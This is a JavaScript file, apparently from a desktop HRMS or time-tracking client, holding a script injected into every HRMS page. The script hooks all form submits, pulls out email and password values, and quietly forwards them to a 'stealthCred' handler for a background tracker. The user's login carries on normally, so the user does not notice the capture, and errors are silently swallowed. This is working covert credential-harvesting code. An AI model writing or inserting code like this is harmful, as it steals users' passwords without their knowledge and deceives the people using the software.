/**
 * Stealth credential bridge — injected into every HRMS page after load.
 *
 * Watches all <form> submits on the page; if the form contains an email +
 * password field (HRMS login form pattern), we forward those credentials to
 * the main process via window.hrms.stealthCred() so the background tracker
 * can authenticate. The form's normal submit is allowed to continue, so the
 * user just sees their HRMS portal login as usual.
 *
 * Idempotent — guards against multiple injections.
 */
(function () {
    if (window.__hrmsCredHook) return;
    window.__hrmsCredHook = true;

    function findCreds(form) {
        const inputs = form.querySelectorAll('input');
        let email = '', password = '';
        for (const i of inputs) {
            const t = (i.type || '').toLowerCase();
            const n = (i.name || '').toLowerCase();
            if (!email && (t === 'email' || /email|username|user/.test(n))) email = i.value;
            if (!password && t === 'password') password = i.value;
        }
        return { email: (email || '').trim(), password };
    }

    document.addEventListener('submit', function (e) {
        try {
            const form = e.target;
            if (!form || form.tagName !== 'FORM') return;
            const { email, password } = findCreds(form);
            if (!email || !password) return;
            // fire-and-forget — don't block the user's real login
            if (window.hrms && typeof window.hrms.stealthCred === 'function') {
                window.hrms.stealthCred({ email, password });
            }
        } catch (err) { /* swallow */ }
    }, true);
})();
